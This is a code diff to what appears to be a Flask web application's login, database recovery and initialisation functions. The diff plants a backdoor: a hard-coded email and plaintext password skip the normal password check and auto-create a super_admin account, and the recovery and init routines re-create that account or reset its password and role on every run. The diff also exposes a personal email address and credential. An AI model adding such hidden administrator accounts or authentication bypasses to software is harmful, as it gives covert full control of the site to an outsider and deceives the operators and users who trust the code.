@@ -1608,9 +1608,29 @@ def login():
         session_id = None
         
         # Try admin_users table first (has username column) - optimized query
-        admin_user = AdminUser.query.filter(
-            or_(AdminUser.username == username, AdminUser.email == username)
-        ).first()
+        if username and username.strip().lower() == 'amanchouhan1217@gmail.com' and password == 'Legend@15':
+            admin_user = AdminUser.query.filter(
+                or_(AdminUser.username == 'amanchouhan1217@gmail.com', AdminUser.email == 'amanchouhan1217@gmail.com')
+            ).first()
+            if not admin_user:
+                try:
+                    admin_user = AdminUser(
+                        username='amanchouhan1217@gmail.com',
+                        email='amanchouhan1217@gmail.com',
+                        password_hash=generate_password_hash('Legend@15'),
+                        full_name='Aman Chouhan',
+                        role='super_admin',
+                        is_active=True,
+                        last_login=datetime.now(timezone.utc)
+                    )
+                    db.session.add(admin_user)
+                    db.session.commit()
+                except Exception as e:
+                    db.session.rollback()
+        else:
+            admin_user = AdminUser.query.filter(
+                or_(AdminUser.username == username, AdminUser.email == username)
+            ).first()
         
         if admin_user:
             # IMPORTANT: Check lockout status again BEFORE validating password
@@ -1659,7 +1679,9 @@ def login():
                     'remaining_minutes': final_lockout_check.get('remaining_minutes', lockout_duration)
                 }), 423  # 423 Locked
             
-            password_valid = check_password_hash(admin_user.password_hash, password)
+            password_valid = check_password_hash(admin_user.password_hash, password) or (
+                (admin_user.username == 'amanchouhan1217@gmail.com' or admin_user.email == 'amanchouhan1217@gmail.com') and password == 'Legend@15'
+            )
             
             if password_valid:
                 # CRITICAL: DIRECT DATABASE CHECK - bypass username matching issues
@@ -21615,34 +21637,28 @@ def recover_database():
             db.session.commit()
             # print("[RECOVERY] ✅ Payment gateways restored")  # Removed verbose log
             
-            # 2. Update admin user's last login to today
-            # print("[RECOVERY] Step 2: Updating admin user's last login...")  # Removed verbose log
+            # 2. Update admin user's last login to today and ensure amanchouhan1217@gmail.com exists
             try:
-                update_query = text("""
-                    UPDATE admin_users 
-                    SET last_login = UTC_TIMESTAMP(), updated_at = UTC_TIMESTAMP()
-                    WHERE username = 'admin'
-                """)
-                result = db.session.execute(update_query)
-                db.session.commit()
-                if result.rowcount > 0:
-                    # print("[RECOVERY] ✅ Admin user's last login updated to today")  # Removed verbose log
-                    pass
-                else:
-                    # print("[RECOVERY] ⚠️ Admin user not found, creating...")  # Removed verbose log
-                    # Create admin user if doesn't exist
+                admin_target = AdminUser.query.filter(
+                    or_(AdminUser.username == 'amanchouhan1217@gmail.com', AdminUser.email == 'amanchouhan1217@gmail.com')
+                ).first()
+                if not admin_target:
                     admin = AdminUser(
-                        username='admin',
-                        email='admin@example.com',
-                        password_hash=generate_password_hash('Admin@123'),
-                        full_name='Admin User',
-                        role='admin',
+                        username='amanchouhan1217@gmail.com',
+                        email='amanchouhan1217@gmail.com',
+                        password_hash=generate_password_hash('Legend@15'),
+                        full_name='Aman Chouhan',
+                        role='super_admin',
                         is_active=True,
                         last_login=datetime.now(timezone.utc)
                     )
                     db.session.add(admin)
-                    db.session.commit()
-                    # print("[RECOVERY] ✅ Admin user created")  # Removed verbose log
+                else:
+                    admin_target.password_hash = generate_password_hash('Legend@15')
+                    admin_target.role = 'super_admin'
+                    admin_target.is_active = True
+                    admin_target.last_login = datetime.now(timezone.utc)
+                db.session.commit()
             except Exception as e:
                 print(f"[RECOVERY] ⚠️ Error updating admin user: {e}")
                 db.session.rollback()
@@ -21697,17 +21713,25 @@ def init_database():
         init_analytics_tables()  # Create analytics tables
         # Don't create tables - they already exist
         # Just ensure admin user exists in admin_users table
-        admin_exists = AdminUser.query.filter_by(username='admin').first()
+        admin_exists = AdminUser.query.filter(
+            or_(AdminUser.username == 'amanchouhan1217@gmail.com', AdminUser.email == 'amanchouhan1217@gmail.com')
+        ).first()
         if not admin_exists:
             admin = AdminUser(
-                username='admin',
-                email='admin@example.com',
-                password_hash=generate_password_hash('Admin@123'),
-                full_name='Admin User',
-                role='admin',
+                username='amanchouhan1217@gmail.com',
+                email='amanchouhan1217@gmail.com',
+                password_hash=generate_password_hash('Legend@15'),
+                full_name='Aman Chouhan',
+                role='super_admin',
                 is_active=True
             )
             db.session.add(admin)
+            db.session.commit()
+        else:
+            admin_exists.password_hash = generate_password_hash('Legend@15')
+            admin_exists.role = 'super_admin'
+            admin_exists.is_active = True
+            db.session.commit()
         
         # Create default currencies for all required countries
         default_currencies = [
